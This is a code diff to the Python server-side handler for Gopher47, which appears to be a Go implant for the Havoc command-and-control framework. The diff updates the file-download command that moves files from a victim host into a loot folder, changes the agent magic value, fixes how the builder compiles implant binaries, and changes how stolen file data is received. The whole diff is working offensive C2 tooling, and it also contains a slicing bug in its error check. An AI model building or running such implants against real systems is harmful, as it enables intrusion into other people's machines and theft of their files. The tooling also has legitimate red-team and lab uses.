@@ -92,14 +92,14 @@ class CommandUpload(Command):
 
 class CommandDownload(Command):
     Name = "download"
-    Description = "Download a file. Please only use full paths."
-    Help = "Example: download C:\\Users\\Administrator\\flag.txt /home/kali/loot/flag.txt"
+    Description = "Download a file. Please only use full paths. The file will be saved to the data/loot folder."
+    Help = "Example: download C:\\Users\\Administrator\\flag.txt flag.txt"
     NeedAdmin = False
     Mitr = []
     Params = [
         CommandParam(
             name="remote_path",
-            is_file_path=True,
+            is_file_path=False,
             is_optional=False
         ),
         CommandParam(
@@ -134,9 +134,9 @@ class CommandExit(Command):
 class Gopher47(AgentType):
     Name = "Gopher47"
     Author = "@An00bRektn"
-    Version = "0.1"
+    Version = "0.2"
     Description = f"""Golang 3rd party agent for Havoc, version {Version}"""
-    MagicValue = 0x63616665
+    MagicValue = 0x676f676f # "gogo", only ASCII printable magic bytes allowed
 
     Arch = [
         "x64"
@@ -198,15 +198,15 @@ class Gopher47(AgentType):
             # Sleep is in seconds
             print(config['Config'])
             sleep = int(config['Config'].get('Sleep'))
-            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Sleep: {sleep}" )
+            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Sleep (s): {sleep}" )
 
             # Jitter is in milliseconds
             jitter = int(config['Config'].get('JitterRange'))
-            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Jitter: {jitter}" )
+            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Jitter (ms): {jitter}" )
 
             # Timeout Threshold stuff
             timeout = int(config['Config'].get('TimeoutThreshold'))
-            self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Jitter: {jitter}" )
+            self.builder_send_message( config[ 'ClientID' ], "Info", f"Timeout Threshold: {timeout}" )
 
             old_strings = [
                 "Url:",
@@ -218,8 +218,8 @@ class Gopher47(AgentType):
             new_strings = [
                 f'Url: "{urls[0]}",',
                 f'SleepTime: {sleep},',
-                f'JitterRange: {jitter},'
-                f'TimeoutThreshold: {timeout},'
+                f'JitterRange: {jitter},',
+                f'TimeoutThreshold: {timeout},',
             ]
             
             # You better be running this from the project directory >:(
@@ -246,7 +246,7 @@ class Gopher47(AgentType):
 
             system(f"GOOS={os_target} GOARCH=amd64 {compile_cmd} build -o bin/gopher47{ext}")
             
-            with open(join("bin", "gopher47"), 'rb') as fd:
+            with open(join("bin", f"gopher47{ext}"), 'rb') as fd:
                 dat = fd.read()
                 self.builder_send_payload(config["ClientID"], self.Name, dat)
 
@@ -258,7 +258,7 @@ class Gopher47(AgentType):
     def response(self, response: dict) -> bytes:
         agent_header    = response[ "AgentHeader" ]
         print("[+] Receieved request from agent: ", end='')
-        agent_response  = base64.b64decode(response["Response"]) # the teamserver base64 encodes the request.
+        agent_response  = b64decode(response["Response"]) # the teamserver base64 encodes the request.
         print(agent_response.decode())
         agentjson = json.loads(agent_response, strict=False)
         if agentjson["task"] == "register":
@@ -285,10 +285,14 @@ class Gopher47(AgentType):
                 try:
                     # The JSON is likely escaped, you'll need to fix it
                     download_info = json.loads(agentjson["data"])
-                    file_name = download_info["filename"]
-                    file_size = str(download_info["size"])
-                    file_content = b64decode(download_info["filedat"]).decode("utf-8")
-                    self.download_file(AgentID, file_name, file_size, file_content)
+                    if download_info["data"][0:2] == "[!]":
+                        self.console_message(AgentID, "Error", "Received Error: ", download_info["data"])
+                    else:
+                        file_name = download_info["filename"]
+                        file_size = str(download_info["size"])
+                        file_content = b64decode(download_info["data"]).decode("utf-8")
+                        self.download_file(AgentID, file_name, file_size, file_content)
+                        self.console_message(AgentID, "Good", f"Successfully downloaded file to {file_name}. {file_size} bytes written.", '')
                 except Exception as e:
                     self.console_message(AgentID, "Error", "Received Error: ", e)
             
